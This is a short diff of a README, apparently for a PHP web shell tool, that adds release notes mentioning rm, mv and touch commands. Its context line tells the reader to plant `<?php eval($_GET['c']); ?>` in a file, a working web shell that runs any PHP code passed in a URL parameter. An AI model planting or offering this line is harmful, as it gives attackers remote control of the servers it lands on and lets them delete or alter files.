@@ -29,6 +29,11 @@ Just place the following code inside it: `<?php eval($_GET['c']); ?>`.
 Easy as that. 
 
 ## Release History
+* 1.1
+   * Fixed communications error
+   * Added rm command
+   * Added mv command
+   * Added touch command
 
 * 1.0
     * First release!
